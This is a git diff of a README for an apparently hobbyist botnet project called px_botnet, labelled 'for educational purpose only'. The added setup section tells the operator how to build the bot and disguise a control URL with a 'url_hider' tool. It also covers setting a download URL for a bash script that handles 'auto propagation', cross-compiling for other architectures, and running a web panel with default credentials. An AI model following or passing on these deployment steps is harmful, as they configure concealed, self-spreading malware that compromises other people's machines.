@@ -3,7 +3,7 @@
 </h1>
 
 <p align="center">
-	<b><i>Development repo for educational purpose only !</i></b><br>
+	<b><i>Development repo for educational purpose only (Made for fun)!</i></b><br>
 </p>
 
 <p align="center">
@@ -17,7 +17,17 @@
 ---
 ## Setup :
 
-sudo apt install -y libssh-dev
+(sudo) apt install gcc make
+
+cd BOT && make
+cd url_hider && ./url_hider "your url"
+
+Edit includes/px_botnet.h - stringifer with your url hided
+						  - download_url with url of bash script for the auto propagation
+
+make re
+
+If you want to cross compile custom Makefile at line 82 with a "." before "$(cross)" and use : "make everything"
 
 ## Usage :
 Bot : make
@@ -28,6 +38,9 @@ Website : (Upload db, configure config/config.php) Default user : test test
 
 ## Tools :
  > - [Makefile](https://github.com/PandeoF1/makefile) <br />
+
+## Sources :
+ > - [HTTP_REQUEST](https://github.com/odrevet/HTTP-Request)
 
 ## (づ｡◕‿‿◕｡)づ :
 ```
